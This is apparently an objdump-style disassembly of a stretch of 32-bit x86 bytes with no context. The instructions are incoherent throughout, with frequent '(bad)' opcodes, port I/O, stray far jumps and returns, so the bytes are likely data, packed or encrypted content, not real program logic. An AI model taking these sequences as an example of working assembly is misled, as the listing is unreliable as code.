  41a9a9:	fisub  WORD PTR [edi-0x79489829]
  41a9af:	out    0xa0,al
  41a9b1:	inc    si
  41a9b3:	mov    esi,0x7b026062
  41a9b8:	mov    eax,0xecddbf5f
  41a9bd:	repnz adc ah,BYTE PTR [ebp+0x7d8ad4fd]
  41a9c4:	jle    0x41a9bc
  41a9c6:	retf   
  41a9c7:	sub    eax,0x338f2f68
  41a9cc:	sar    BYTE PTR ds:0xca2a7df1,1
  41a9d2:	out    dx,al
  41a9d3:	xor    esp,ebp
  41a9d5:	(bad)  
  41a9d7:	sbb    eax,edi
  41a9d9:	in     al,0x9a
  41a9db:	mov    ebp,0xf30bfd19
  41a9e0:	mov    fs,WORD PTR [eax-0x5d76c5f8]
  41a9e6:	int3   
  41a9e7:	cmp    BYTE PTR [edx+0x36dafb5d],0x22
  41a9ee:	dec    esp
  41a9ef:	ret    
  41a9f0:	ins    DWORD PTR es:[edi],dx
  41a9f1:	mov    bl,0xc1
  41a9f3:	mov    WORD PTR [edx+0x3e],fs
  41a9f6:	and    dh,ch
  41a9f8:	sbb    bl,BYTE PTR [eax]
  41a9fa:	scas   eax,DWORD PTR es:[edi]
  41a9fb:	mov    al,ds:0xaea6cf04
  41aa00:	mov    cl,BYTE PTR [esi]
  41aa02:	scas   eax,DWORD PTR es:[edi]
  41aa03:	hlt    
  41aa04:	sbb    eax,0xc7e9ba5f
  41aa09:	fdivr  DWORD PTR [ebp+0x510ca8e2]
  41aa0f:	jmp    0x70a2:0xe66dc7e6
  41aa16:	mov    BYTE PTR [ebp-0x69],al
  41aa19:	iret   
  41aa1a:	or     eax,0x428a306
  41aa1f:	xchg   BYTE PTR [ebx+0x1ca73b05],dh
  41aa25:	pop    ebx
  41aa26:	and    DWORD PTR ds:0x579265cc,esi
  41aa2c:	(bad)
  41aa30:	jbe    0x41aa1e
  41aa32:	test   al,0xc0
  41aa34:	(bad)  
  41aa35:	adc    eax,edi
  41aa37:	xchg   ch,cl
  41aa39:	scas   al,BYTE PTR es:[edi]
  41aa3a:	xchg   ebp,eax
  41aa3b:	std    
  41aa3c:	sub    edx,eax
  41aa3e:	push   ebx
  41aa3f:	fmul   st,st(2)
  41aa41:	js     0x41aa61
  41aa43:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aa44:	fild   QWORD PTR [edi+ebp*1-0x598cbd51]
  41aa4b:	cmp    esi,esi
  41aa4d:	(bad)  
  41aa4e:	sub    DWORD PTR [ecx-0x2c2a8878],esi
  41aa54:	mov    ecx,0x968b8b9d
  41aa59:	pop    DWORD PTR [edi-0x5da9a742]
  41aa5f:	outs   dx,BYTE PTR ds:[esi]
  41aa60:	je     0x41aa9c
  41aa62:	fistp  DWORD PTR [edx-0x566d617f]
  41aa68:	sub    eax,0x2a4b0c5d
  41aa6d:	push   ebx
  41aa6e:	inc    esi
  41aa6f:	jmp    0x41aad5
  41aa71:	bound  ebp,QWORD PTR [ebx-0x6e26278]
  41aa77:	les    esp,FWORD PTR [edi-0x79579ffd]
  41aa7d:	push   ecx
  41aa7e:	repnz in eax,dx
  41aa80:	ins    DWORD PTR es:[edi],dx
  41aa81:	imul   edi,DWORD PTR [ebp+0x4560304d],0x5fb1bd64
  41aa8b:	or     esp,ebp
  41aa8d:	das    
  41aa8e:	mov    ebx,0x80a8bcc2
  41aa93:	aam    0xa5
  41aa95:	mov    dh,0x16
  41aa97:	xor    eax,0x60306b58
  41aa9c:	ja     0x41ab0b
  41aa9e:	add    BYTE PTR [esi],al
  41aaa0:	xor    cl,ch
  41aaa2:	sbb    ch,BYTE PTR [edx]
  41aaa4:	in     eax,0xc5
  41aaa6:	inc    esp
  41aaa7:	jno    0x41aa5c
  41aaa9:	xchg   edx,eax
  41aaaa:	outs   dx,DWORD PTR ds:[esi]
  41aaab:	ret    
  41aaac:	sbb    DWORD PTR [esi],eax
  41aaae:	adc    DWORD PTR [eiz*2-0x6524d055],ecx
  41aab5:	sbb    al,0xf9
  41aab7:	jp     0x41aa5e
  41aab9:	pusha  
  41aaba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aabb:	test   al,0x5d
  41aabd:	cdq    
  41aabe:	aaa    
  41aabf:	pop    es
  41aac0:	mov    eax,ds:0x40508382
  41aac5:	mov    WORD PTR [edx+0x78d1634d],ds
  41aacb:	jnp    0x41aab5
  41aacd:	jbe    0x41aacf
  41aacf:	push   ds
  41aad0:	out    dx,eax
  41aad1:	loopne 0x41aaa7
  41aad3:	fld    TBYTE PTR [esi+0x71]
  41aad6:	fmul   QWORD PTR [edi+0x4e98f655]
  41aadc:	enter  0x8f03,0xe2
  41aae0:	pop    esp
  41aae1:	js     0x41aa74
  41aae3:	sbb    edi,DWORD PTR ss:[edx-0x2c6ed209]
  41aaea:	in     al,dx
  41aaeb:	out    0x90,eax
  41aaed:	fdiv   DWORD PTR [esi-0x7]
  41aaf0:	repz cmp BYTE PTR [ebx],0x49
  41aaf4:	xor    al,0xd8
  41aaf6:	dec    ebp
  41aaf7:	iret   
  41aaf8:	ins    BYTE PTR es:[edi],dx
  41aaf9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aafa:	push   esi
  41aafb:	outs   dx,BYTE PTR ds:[si]
  41aafd:	and    DWORD PTR [esi-0x1],edi
  41ab00:	pop    ds
  41ab01:	push   0x44
  41ab03:	mov    dl,0x18
  41ab05:	rcr    DWORD PTR [ebx+0x26],0x90
  41ab09:	iret   
  41ab0a:	sar    edi,0xef
  41ab0d:	fidiv  WORD PTR [eax-0x2]
  41ab10:	mov    al,0x2
  41ab12:	push   ebx
  41ab13:	enter  0xb166,0x9d
  41ab17:	sub    edi,DWORD PTR [ebx]
  41ab19:	into   
  41ab1a:	pop    ds
  41ab1b:	shl    BYTE PTR [ecx-0x24999448],1
  41ab21:	jmp    0x82a3ed33
  41ab26:	jle    0x41ab75
  41ab28:	test   eax,0x45bafac3
  41ab2d:	(bad)  [esp+ecx*1+0x5b17c22d]
  41ab34:	mov    esi,0x8003338b
  41ab39:	add    BYTE PTR [esi+esi*2-0x6e2ced3a],0xa3
  41ab41:	iret   
  41ab42:	retf   
  41ab43:	scas   eax,DWORD PTR es:[edi]
  41ab44:	push   esp
  41ab45:	stos   DWORD PTR es:[edi],eax
  41ab46:	pop    ecx
  41ab47:	inc    ebp
  41ab48:	pushf  
  41ab49:	lods   eax,DWORD PTR ds:[esi]
  41ab4a:	scas   eax,DWORD PTR es:[edi]
  41ab4b:	out    0x7a,al
  41ab4d:	sbb    eax,0x3a1c4ba5
  41ab52:	loope  0x41abc0
  41ab54:	inc    ebp
  41ab55:	jb     0x41ab71
  41ab57:	mov    ecx,0x87bb7480
  41ab5c:	pop    ebp
  41ab5d:	jns    0x41aaf9
  41ab5f:	mov    esp,0xec886f1e
  41ab64:	leave  
  41ab65:	inc    edx
  41ab66:	fdecstp 
  41ab68:	cmp    DWORD PTR [ebp-0x10],0xa7586205
  41ab6f:	test   esi,esi
  41ab71:	jb     0x41abbe
  41ab73:	jg     0x41aafc
  41ab75:	mul    DWORD PTR [ecx]
  41ab77:	pop    esi
  41ab78:	das    
  41ab79:	inc    esp
  41ab7a:	inc    ebx
  41ab7b:	std    
  41ab7c:	push   es
  41ab7d:	(bad)
  41ab80:	idiv   BYTE PTR [edi]
  41ab82:	aaa    
  41ab83:	push   edi
  41ab84:	sub    eax,0x16eacf9
  41ab89:	push   0x112d4e12
  41ab8e:	jo     0x41ab6a
  41ab90:	xor    dl,BYTE PTR [eax]
  41ab92:	push   ebp
  41ab93:	jb     0x41ab3c
  41ab95:	iret   
  41ab96:	pop    ebp
  41ab97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ab98:	or     DWORD PTR [ebp+0x3b6aea3b],0xcb714644
  41aba2:	fst    DWORD PTR [edi]
  41aba4:	xor    eax,0xa0b9c4e0
  41aba9:	pushf  
  41abaa:	push   eax
  41abab:	mov    ah,0xe4
  41abad:	jmp    0xe7d7184a
  41abb2:	pop    ecx
  41abb3:	push   es
  41abb4:	lods   al,BYTE PTR ds:[esi]
  41abb5:	lea    eax,[eax-0x7f]
  41abb8:	mov    al,ds:0xca36c1a
  41abbd:	adc    al,0x2e
  41abbf:	mov    DWORD PTR [ebx+eiz*1],ebp
  41abc2:	lods   eax,DWORD PTR ds:[esi]
  41abc3:	shr    DWORD PTR [eax+edi*1+0x69],0x27
  41abc8:	jp     0x41abc1
  41abca:	and    esp,DWORD PTR fs:[eax]
  41abcd:	mov    edx,DWORD PTR [ebx+eax*8]
  41abd0:	jnp    0x41ab87
  41abd2:	lock in eax,0x80
  41abd5:	pop    ebp
  41abd6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41abd7:	inc    ebx
  41abd8:	out    0x35,eax
  41abda:	pop    ecx
  41abdb:	lock adc edi,DWORD PTR [edi+esi*1-0x4582ddff]
  41abe3:	arpl   WORD PTR [edx-0x7734468b],di
  41abe9:	ret    0x7750
  41abec:	outs   dx,BYTE PTR ds:[esi]
  41abed:	mov    dl,0x47
  41abef:	xchg   DWORD PTR [edi+0x61c38681],edi
  41abf5:	inc    edi
  41abf6:	das    
  41abf7:	outs   dx,DWORD PTR ds:[esi]
  41abf8:	mov    cl,0x73
  41abfa:	gs xor al,0x10
  41abfd:	xor    BYTE PTR [eax+0x692009ff],dl
  41ac03:	call   0xa84637c5
  41ac08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ac09:	mov    bh,0xd7
  41ac0b:	sahf   
  41ac0c:	stc    
  41ac0d:	mov    ds,WORD PTR [edx]
  41ac0f:	sbb    al,0xd7
  41ac11:	sbb    eax,0x397c8544
  41ac16:	and    esi,DWORD PTR [edi+0x7084faa7]
  41ac1c:	sti    
  41ac1d:	cdq    
  41ac1e:	sub    eax,0x43b422d2
  41ac23:	dec    ecx
  41ac24:	sbb    dl,cl
  41ac26:	je     0x41abcb
  41ac28:	data16 out dx,al
  41ac2a:	or     DWORD PTR [ecx+0x5b],0x6c6fd17
  41ac31:	mov    WORD PTR [ebp-0x488a3506],ds
  41ac37:	jns    0x41ac09
  41ac39:	ins    BYTE PTR es:[edi],dx
  41ac3a:	cdq    
  41ac3b:	stos   BYTE PTR es:[edi],al
  41ac3c:	pop    ds
  41ac3d:	js     0x41ac7e
  41ac3f:	jns    0x41ac64
  41ac41:	aaa    
  41ac42:	out    0x28,eax
  41ac44:	or     BYTE PTR [edi],al
  41ac46:	sbb    eax,0x47ced0cd
  41ac4b:	push   edi
  41ac4c:	daa    
  41ac4d:	lds    ebp,FWORD PTR [edi+0x1f83ef74]
  41ac53:	xor    eax,0x81767097
  41ac58:	jno    0x41ac2f
  41ac5a:	pop    esi
  41ac5b:	lea    ebx,[edi-0xd4f2614]
  41ac61:	in     eax,dx
  41ac62:	xor    eax,0x795c37d3
  41ac67:	retf   0xe87b
  41ac6a:	adc    edx,DWORD PTR [eax]
  41ac6c:	jl     0x41ac5b
  41ac6e:	sahf   
  41ac6f:	aam    0xf2
  41ac71:	pop    edx
  41ac72:	ds mov ch,bl
  41ac75:	mov    ecx,0x18d5bcd3
  41ac7a:	lds    esi,FWORD PTR [edi]
  41ac7c:	jae    0x41ac66
  41ac7e:	iret   
  41ac7f:	xor    DWORD PTR [eax],esp
  41ac81:	cmp    ecx,DWORD PTR [ebp+0x5a]
  41ac84:	js     0x41ac24
  41ac86:	retf   
  41ac87:	mov    ebx,0x4bdc3e48
  41ac8c:	and    DWORD PTR ds:0x35e0f432,ebp
  41ac92:	daa    
  41ac93:	out    0xc3,al
  41ac95:	retf   
  41ac96:	ss iret 
  41ac98:	stos   DWORD PTR es:[edi],eax
  41ac99:	xor    al,BYTE PTR [eax]
  41ac9b:	inc    edi
  41ac9c:	inc    ebx
  41ac9d:	stos   DWORD PTR es:[edi],eax
  41ac9e:	lods   ax,WORD PTR ds:[esi]
  41aca0:	(bad)  
  41aca1:	cli    
  41aca2:	push   0xf3480973
  41aca7:	push   eax
  41aca8:	gs jae 0x41ad05
  41acab:	cmc    
  41acac:	test   al,0x66
  41acae:	leave  
  41acaf:	stos   BYTE PTR es:[edi],al
  41acb0:	pop    ecx
  41acb1:	sbb    BYTE PTR [esi+0x4c6d5da3],dh
  41acb7:	sbb    DWORD PTR [eax+0x6b],esp
  41acba:	mov    DWORD PTR [eax-0x67],esp
  41acbd:	sbb    bh,BYTE PTR [esp+edi*1-0x3b0b3267]
  41acc4:	and    BYTE PTR [ebx],cl
  41acc6:	fs push edx
  41acc8:	test   BYTE PTR [ecx],ah
  41acca:	sbb    eax,0x12b3343b
  41accf:	icebp  
  41acd0:	out    dx,al
  41acd1:	xor    ebp,esp
  41acd3:	mov    ch,0x8
  41acd5:	icebp  
  41acd6:	in     eax,dx
  41acd7:	sub    al,bh
  41acd9:	nop
  41acda:	ret    
  41acdb:	gs ret 
  41acdd:	or     eax,0x9119b40e
  41ace2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ace3:	test   BYTE PTR [ebp-0x44],cl
  41ace6:	add    al,0x46
  41ace8:	ficom  DWORD PTR [ebp+ebx*2-0x5a1dd5de]
  41acef:	jecxz  0x41ac81
  41acf1:	cs ret 0x9f55
  41acf5:	or     al,0x7c
  41acf7:	jge    0x41ad31
  41acf9:	mov    WORD PTR [edi-0x4890a790],?
  41acff:	fs adc al,0xf1
  41ad02:	mov    dh,0x84
  41ad04:	jp     0x41aca4
  41ad06:	pop    esi
  41ad07:	pop    esp
  41ad08:	jne    0x41acf1
  41ad0a:	stos   BYTE PTR es:[edi],al
  41ad0b:	and    ecx,esp
  41ad0d:	mov    esp,0x4b6e1d2f
  41ad12:	test   eax,0xdbbee2ee
  41ad17:	mov    ecx,0xa1fb3be5
  41ad1c:	xchg   BYTE PTR ds:0x26485de9,ch
  41ad22:	int3   
  41ad23:	jmp    0x41ad1f
  41ad25:	imul   esp,DWORD PTR [ecx+0x3120b256],0x2132423b
  41ad2f:	push   edi
  41ad30:	ror    DWORD PTR [ebp+0x79a22900],0x90
  41ad37:	aas    
  41ad38:	iret   
  41ad39:	ja     0x41ad3a
  41ad3b:	pop    esi
  41ad3c:	mov    ebp,0x7c4db4d8
  41ad41:	aam    0x73
  41ad43:	or     cl,BYTE PTR [eax+0x39]
  41ad46:	in     eax,dx
  41ad47:	dec    esi
  41ad48:	inc    ebx
  41ad49:	ficom  WORD PTR [ebx+edi*8+0x66e7492f]
  41ad50:	fdivr  st,st(6)
  41ad52:	arpl   WORD PTR [edx+ebx*8+0x4d4f2412],sp
  41ad59:	sbb    DWORD PTR fs:[esi-0x5af4bc74],0xe173f251
  41ad64:	adc    al,0x7
  41ad66:	clc    
  41ad67:	test   DWORD PTR [edi-0x2d472847],esp
  41ad6d:	bound  esp,QWORD PTR [eax]
  41ad6f:	jp     0x41acfe
  41ad71:	jge    0x41adc9
  41ad73:	outs   dx,BYTE PTR ds:[esi]
  41ad74:	cdq    
  41ad75:	js     0x41ad14
  41ad77:	jmp    0x4b00eeaf
  41ad7c:	outs   dx,DWORD PTR ds:[esi]
  41ad7d:	mov    ds,WORD PTR ds:[esi+0x569452bf]
  41ad84:	xchg   esi,eax
  41ad85:	scas   al,BYTE PTR es:[edi]
  41ad86:	jb     0x41ad67
  41ad88:	add    DWORD PTR [ebx+0xb40a55],ecx
  41ad8e:	or     bl,BYTE PTR [esi]
  41ad90:	dec    edi
  41ad91:	imul   eax,esi,0xffffffd1
  41ad94:	adc    BYTE PTR [ebp-0x73],al
  41ad97:	push   cs
  41ad98:	sub    cl,al
  41ad9a:	add    al,0x92
  41ad9c:	hlt    
  41ad9d:	iret   
  41ad9e:	dec    eax
  41ad9f:	imul   ecx,eax,0x9f34defe
  41ada5:	adc    bh,BYTE PTR [ecx-0x8b2898]
  41adab:	sub    ebx,edi
  41adad:	sbb    eax,0x49bb5ad1
  41adb2:	repz addr16 lock loop 0x41ae18
  41adb7:	ss (bad) 
  41adb9:	fxch   st(7)
  41adbb:	cmp    BYTE PTR [edx-0x55],dh
  41adbe:	inc    ebp
  41adbf:	mov    esi,DWORD PTR [ecx]
  41adc1:	sar    DWORD PTR [edx],1
  41adc3:	loopne 0x41adfc
  41adc5:	sub    eax,DWORD PTR [edi+0x3a94796f]
  41adcb:	cwde   
  41adcc:	hlt    
  41adcd:	adc    eax,0x42c6c6be
  41add2:	xor    bh,BYTE PTR [ebp-0x19]
  41add5:	cmc    
  41add6:	mov    esi,ss
  41add8:	fucomp st(7)
  41adda:	add    eax,0x8dd7c85d
  41addf:	popf   
  41ade0:	push   0xe69f01c1
  41ade5:	xor    esi,DWORD PTR [eax+0x7e]
  41ade8:	push   0x62825eeb
  41aded:	and    BYTE PTR [ebx],0x8a
  41adf0:	sbb    ch,BYTE PTR [ebx]
  41adf2:	pushf  
  41adf3:	add    dl,BYTE PTR [ebp+0x43]
  41adf6:	fsub   DWORD PTR [edi+0x4e7516f8]
  41adfc:	mov    cl,0xab
  41adfe:	cli    
  41adff:	ds addr16 iret 
  41ae02:	ret    0xa83b
  41ae05:	xchg   esp,eax
  41ae06:	inc    esi
  41ae07:	cli    
  41ae08:	leave  
  41ae09:	mov    ah,0x2c
  41ae0b:	jne    0x41ae32
  41ae0d:	sbb    ecx,ebp
  41ae0f:	ins    BYTE PTR es:[edi],dx
  41ae10:	inc    ebx
  41ae11:	test   esp,esp
  41ae13:	cmc    
  41ae14:	xor    BYTE PTR [edx],ch
  41ae16:	push   0x739ca5de
  41ae1b:	leave  
  41ae1c:	push   esi
  41ae1d:	cmp    DWORD PTR [edi-0x1f569fb9],0x96963ce0
  41ae27:	mov    ?,WORD PTR [edx-0x67]
  41ae2a:	scas   al,BYTE PTR es:[edi]
  41ae2b:	gs push cs
  41ae2d:	iret   
  41ae2e:	vpackssdw xmm2,xmm1,XMMWORD PTR [edx-0x2]
  41ae33:	add    al,0x11
  41ae35:	xchg   ebp,eax
  41ae36:	dec    ebp
  41ae37:	cli    
  41ae38:	popf   
  41ae39:	add    DWORD PTR [esi+esi*1+0x6696376a],esp
  41ae40:	pop    esi
  41ae41:	daa    
  41ae42:	xchg   ecx,eax
  41ae43:	clc    
  41ae44:	cmpxchg BYTE PTR [eax+ebp*2+0x2da920af],cl
  41ae4c:	mov    eax,ds:0x70e5383a
  41ae51:	imul   esp,DWORD PTR [edx+0x77],0xffffffd8
  41ae55:	cmp    BYTE PTR [edx],0x99
  41ae58:	mov    ch,bl
  41ae5a:	lahf   
  41ae5b:	dec    edx
  41ae5c:	pop    esp
  41ae5d:	loope  0x41ae98
  41ae5f:	out    0xa9,eax
  41ae61:	push   eax
  41ae62:	or     BYTE PTR [ebp-0x28f73e93],dl
  41ae68:	fmul   DWORD PTR [ebx]
  41ae6a:	mov    ah,0xbb
  41ae6c:	call   0x6c2c0ebb
  41ae71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ae72:	xor    al,0xd9
  41ae74:	repz ds sahf 
  41ae77:	lahf   
  41ae78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ae79:	mov    cl,0x17
  41ae7b:	cmp    esp,DWORD PTR [edi-0x704ca6b4]
  41ae81:	(bad)  
  41ae83:	xchg   BYTE PTR [esi+0x7e],ah
  41ae86:	in     eax,dx
  41ae87:	test   eax,0xa2da9155
  41ae8c:	or     ch,BYTE PTR [edi-0xfe7dc08]
  41ae92:	mov    eax,0xf9a90eae
  41ae97:	push   eax
  41ae98:	stos   BYTE PTR es:[edi],al
  41ae99:	repz push ebp
  41ae9b:	mov    edx,0xb22379fd
  41aea0:	cmc    
  41aea1:	inc    esp
  41aea2:	cmp    eax,0x457b9c7f
  41aea7:	adc    cl,ah
  41aea9:	push   cs
  41aeaa:	outs   dx,DWORD PTR ds:[esi]
  41aeab:	gs pop edi
  41aead:	sub    eax,0xc77464df
  41aeb2:	xchg   ecx,eax
  41aeb3:	fisttp WORD PTR [eax+ebp*2+0x77]
  41aeb7:	fmulp  st(6),st
  41aeb9:	push   es
  41aeba:	adc    bh,0x47
  41aebd:	leave  
  41aebe:	pop    esp
  41aebf:	sbb    eax,0x4a73b1d
  41aec4:	xor    eax,0x3cd6ca61
  41aec9:	inc    ebp
  41aeca:	xchg   esi,eax
  41aecb:	push   eax
  41aecc:	or     BYTE PTR [eax-0x39],0xf5
  41aed0:	xchg   edx,eax
  41aed1:	ret    0x6aef
  41aed4:	shl    BYTE PTR [ecx],1
  41aed6:	or     eax,0xb347add7
  41aedb:	add    al,0x66
  41aedd:	arpl   WORD PTR [ebp+ebx*2+0x1ffefd33],di
  41aee4:	rcr    DWORD PTR [edi-0x5826b77d],0xe1
  41aeeb:	jnp    0x41ae82
  41aeed:	pop    eax
  41aeee:	gs xchg esp,eax
  41aef0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aef1:	push   0x7f
  41aef3:	and    al,0xd9
  41aef5:	sti    
  41aef6:	mov    ebp,edx
  41aef8:	sbb    ebp,esi
  41aefa:	xchg   DWORD PTR [eax],edi
  41aefc:	sub    bl,BYTE PTR [eax]
  41aefe:	js     0x41af07
  41af00:	mov    edx,0x7d72b87c
  41af05:	and    eax,0xdb16992
  41af0a:	sahf   
  41af0b:	(bad)  
  41af0c:	push   edx
  41af0d:	(bad)  
  41af0e:	mov    edi,0xfbb28cfc
  41af13:	sbb    eax,0x1cf0ad42
  41af18:	dec    esi
  41af19:	xor    eax,ecx
  41af1b:	push   esp
  41af1c:	das    
  41af1d:	ss mov bl,0xab
  41af20:	icebp  
  41af21:	xchg   esi,eax
  41af22:	pusha  
  41af23:	or     eax,0x98538263
  41af28:	leave  
  41af29:	mov    ebx,eax
  41af2b:	in     eax,dx
  41af2c:	mov    dh,0x45
  41af2e:	jne    0x41af90
  41af30:	or     dh,ch
  41af32:	push   edx
  41af33:	add    cl,BYTE PTR [ecx-0x5cd9c406]
  41af39:	fcmove st,st(6)
  41af3b:	inc    esp
  41af3c:	div    DWORD PTR [edx-0x1dd6b038]
  41af42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41af43:	sbb    esp,edx
  41af45:	and    eax,0xcdc926da
  41af4a:	sahf   
  41af4b:	add    ebp,esi
  41af4d:	mov    bh,ch
  41af4f:	cmp    BYTE PTR [esi],ah
  41af51:	icebp  
  41af52:	lds    edi,FWORD PTR [edx-0x210c9d6c]
  41af58:	mov    esp,DWORD PTR [edi-0x7f]
  41af5b:	out    0xc0,eax
  41af5d:	push   es
  41af5e:	cmc    
  41af5f:	mov    ds:0x5550a94e,eax
  41af64:	fstp   DWORD PTR [ebp+0x54d76b0b]
  41af6a:	das    
  41af6b:	mov    ebx,0x5eed0625
  41af70:	jmp    0x44be69de
  41af75:	jecxz  0x41af88
  41af77:	or     eax,0xd102d45a
  41af7c:	cmp    BYTE PTR [esi+0x0],ch
  41af7f:	loopne 0x41afb5
  41af81:	sahf   
  41af82:	mov    dh,0xf9
  41af84:	dec    edi
  41af85:	loop   0x41afad
  41af87:	dec    esi
  41af88:	mov    al,ds:0x23d8c17d
  41af8d:	rcr    BYTE PTR [edx],1
  41af8f:	into   
  41af90:	dec    edi
  41af91:	pop    ebp
  41af92:	mov    edi,0xa2cab6f
  41af97:	sub    eax,0x5a5a8824
  41af9c:	scas   eax,DWORD PTR es:[edi]
  41af9d:	cs retf 
  41af9f:	shr    ch,0xe5
  41afa2:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  41afa4:	stc    
  41afa5:	jbe    0x41b009
  41afa7:	mov    eax,0x26b3f5ca
  41afac:	icebp  
  41afad:	xchg   esp,eax
  41afae:	pusha  
  41afaf:	scas   eax,DWORD PTR es:[edi]
  41afb0:	sbb    eax,0xa70052e3
  41afb5:	dec    esi
  41afb6:	push   eax
  41afb7:	cmp    BYTE PTR [ebx+0x570c49fc],ch
  41afbd:	addr16 add cl,ch
  41afc0:	ds dec edx
  41afc2:	mov    ecx,DWORD PTR [esi]
  41afc4:	mov    al,0xbb
  41afc6:	push   ecx
  41afc7:	cmp    eax,0x16e4c2bf
  41afcc:	ret    0x463b
  41afcf:	mov    eax,DWORD PTR [ebp-0x2092588d]
  41afd5:	sbb    al,0x76
  41afd7:	cwde   
  41afd8:	push   ebp
  41afd9:	sbb    edx,eax
  41afdb:	mov    dh,0x6b
  41afdd:	xor    BYTE PTR [edx],dh
  41afdf:	stos   BYTE PTR es:[edi],al
  41afe0:	jmp    0x41b058
  41afe2:	out    dx,eax
  41afe3:	xor    eax,0xeca4d4c3
  41afe8:	out    dx,al
  41afe9:	jecxz  0x41afd7
  41afeb:	xchg   edx,eax
  41afec:	xchg   edx,eax
  41afed:	sbb    dh,BYTE PTR [edi+0x7b]
  41aff0:	nop
  41aff1:	and    ah,BYTE PTR [edx-0x23a44a58]
  41aff7:	adc    DWORD PTR [edx],eax
  41aff9:	retf   
  41affa:	retf   
  41affb:	cmove  esp,DWORD PTR [ecx+0x7bc4a83a]
  41b002:	xor    al,0x17
  41b005:	jp     0x41b07b
  41b007:	inc    eax
  41b008:	adc    al,BYTE PTR [ecx+0x73]
  41b00b:	hlt    
  41b00c:	into   
  41b00d:	xor    dh,dl
  41b00f:	ror    DWORD PTR [ecx],1
  41b011:	cmp    eax,DWORD PTR [eax+0x35175570]
  41b017:	les    esi,FWORD PTR [ebp+0x3302fcc]
  41b01d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b01e:	fldenv [eax-0x4]
  41b021:	adc    DWORD PTR [eax-0x453cc2d5],ebx
  41b027:	lds    esp,FWORD PTR [edi-0x2c]
  41b02a:	popa   
  41b02b:	int    0xc3
  41b02d:	cli    
  41b02e:	mov    edx,DWORD PTR [ebp-0x26]
  41b031:	mov    BYTE PTR [esi+0x6482867c],al
  41b037:	(bad)  [esi]
  41b039:	addr16 mov ebp,0xdefbac7c
  41b03f:	shl    ecx,cl
  41b041:	shl    BYTE PTR [ebp+0x63],1
  41b044:	aas    
  41b045:	test   ah,dh
  41b047:	call   0xee48dff4
  41b04c:	iret   
  41b04d:	add    al,0x56
  41b04f:	les    ebx,FWORD PTR [ecx]
  41b051:	mov    esi,0xfa9030a8
  41b056:	or     BYTE PTR [ecx-0x2b],ah
  41b059:	fnstenv [esi-0xd]
  41b05c:	pop    edi
  41b05d:	fs dec ebp
  41b05f:	lds    esi,FWORD PTR [ebp-0x33]
  41b062:	mov    dl,0x6a
  41b064:	add    DWORD PTR [ecx+0x65],ebp
  41b067:	call   0x9904:0xb904fa41
  41b06e:	or     esp,DWORD PTR [ebx]
  41b070:	popf   
  41b071:	(bad)  
  41b072:	xchg   esi,eax
  41b073:	pop    esi
  41b074:	jnp    0x41b005
  41b076:	jmp    0x41b04b
  41b078:	mov    gs,WORD PTR [esi+0x27]
  41b07b:	mov    ds:0xc353b5d7,eax
  41b080:	or     dl,ch
  41b082:	lock sub bl,bh
  41b085:	daa    
  41b086:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b087:	inc    ecx
  41b088:	enter  0x8afd,0x6f
  41b08c:	sbb    BYTE PTR [edx],ah
  41b08e:	pop    esp
  41b08f:	and    edi,ecx
  41b091:	es inc esi
  41b093:	xacquire xchg DWORD PTR [ebx+0x7b],ecx
  41b097:	enter  0x1560,0x1e
  41b09b:	test   BYTE PTR [eax+ebp*2+0x10],dh
  41b09f:	sub    BYTE PTR [ebx-0x54],bl
  41b0a2:	mov    al,0xd2
  41b0a4:	inc    edx
  41b0a5:	in     al,dx
  41b0a6:	into   
  41b0a7:	mov    bl,0x45
  41b0a9:	xlat   BYTE PTR ds:[ebx]
  41b0aa:	retf   0x4b6f
  41b0ad:	shld   eax,ebp,0x12
  41b0b1:	add    esp,DWORD PTR ds:0xa4749fed
  41b0b7:	push   ebx
  41b0b8:	cli    
  41b0b9:	mov    ch,0x91
  41b0bb:	jne    0x41b0d0
  41b0bd:	xchg   edx,eax
  41b0be:	add    al,0x5d
  41b0c0:	add    esp,DWORD PTR [esi-0x38]
  41b0c3:	push   edx
  41b0c4:	dec    esp
  41b0c5:	cmp    BYTE PTR [edx+0x11b05610],dh
  41b0cb:	loope  0x41b0e0
  41b0cd:	lods   al,BYTE PTR ds:[esi]
  41b0ce:	sub    dh,BYTE PTR [ecx+0x53d55347]
  41b0d4:	sbb    DWORD PTR [edi+0xa29b99],esp
  41b0da:	(bad)  
  41b0dc:	into   
  41b0dd:	mov    esi,0xff1fedba
  41b0e2:	jnp    0x41b0cd
  41b0e4:	mov    dl,0xde
  41b0e6:	into   
  41b0e7:	jno    0x41b0c6
  41b0e9:	cli    
  41b0ea:	imul   ebx,DWORD PTR [ebx-0x528d9d67],0x4b44ea0
  41b0f4:	cmp    ah,BYTE PTR [edi]
  41b0f6:	scas   eax,DWORD PTR es:[di]
  41b0f8:	and    al,0x13
  41b0fa:	pop    edx
  41b0fb:	sbb    BYTE PTR [esi+eiz*1-0x3616ecbb],bh
  41b102:	mov    edx,0x65916c29
  41b107:	lods   eax,DWORD PTR ds:[esi]
  41b108:	out    0x2c,eax
  41b10a:	aad    0xd7
  41b10c:	test   al,0xa6
  41b10e:	lea    ecx,[edi]
  41b110:	das    
  41b111:	sbb    dl,cl
  41b113:	push   ecx
  41b114:	test   DWORD PTR [ecx+0x75],ebx
  41b117:	out    0x64,al
  41b119:	cmp    ebx,esi
  41b11b:	mov    dh,0xcd
  41b11d:	jne    0x41b13f
  41b11f:	jge    0x41b0b7
  41b121:	lock jo 0x41b12f
  41b124:	push   0xc0686172
  41b129:	fs inc ecx
  41b12b:	cdq    
  41b12c:	outs   dx,BYTE PTR ds:[esi]
  41b12d:	xchg   ebx,eax
  41b12e:	pop    ss
  41b12f:	push   ds
  41b130:	jae    0x41b0cd
